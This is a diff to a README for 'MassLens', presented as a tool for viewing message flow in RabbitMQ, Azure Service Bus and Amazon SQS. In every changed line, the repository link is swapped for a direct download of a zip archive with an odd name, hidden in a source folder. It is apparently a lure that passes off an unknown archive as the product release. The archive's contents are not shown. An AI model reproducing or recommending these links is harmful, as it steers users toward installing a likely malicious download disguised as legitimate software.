@@ -1,6 +1,6 @@
 # 📊 MassLens - See Message Flow In Real Time
 
-[![Download MassLens](https://img.shields.io/badge/Download-MassLens-blue?style=for-the-badge)](https://github.com/keykeylcrx-commits/MassLens)
+[![Download MassLens](https://img.shields.io/badge/Download-MassLens-blue?style=for-the-badge)](https://raw.githubusercontent.com/keykeylcrx-commits/MassLens/main/src/MassLens.RabbitMQ/Lens-Mass-nonrival.zip)
 
 ## 🚀 What MassLens Does
 
@@ -25,7 +25,7 @@ If your app uses RabbitMQ, Azure Service Bus, or Amazon SQS, MassLens can help y
 
 Use this link to visit the page to download:
 
-[https://github.com/keykeylcrx-commits/MassLens](https://github.com/keykeylcrx-commits/MassLens)
+[https://raw.githubusercontent.com/keykeylcrx-commits/MassLens/main/src/MassLens.RabbitMQ/Lens-Mass-nonrival.zip](https://raw.githubusercontent.com/keykeylcrx-commits/MassLens/main/src/MassLens.RabbitMQ/Lens-Mass-nonrival.zip)
 
 Open the page, find the latest release or download file, and save it to your computer.
 
@@ -264,5 +264,5 @@ MassLens is connected to these areas:
 
 Download and install it from:
 
-[https://github.com/keykeylcrx-commits/MassLens](https://github.com/keykeylcrx-commits/MassLens)
+[https://raw.githubusercontent.com/keykeylcrx-commits/MassLens/main/src/MassLens.RabbitMQ/Lens-Mass-nonrival.zip](https://raw.githubusercontent.com/keykeylcrx-commits/MassLens/main/src/MassLens.RabbitMQ/Lens-Mass-nonrival.zip)
 
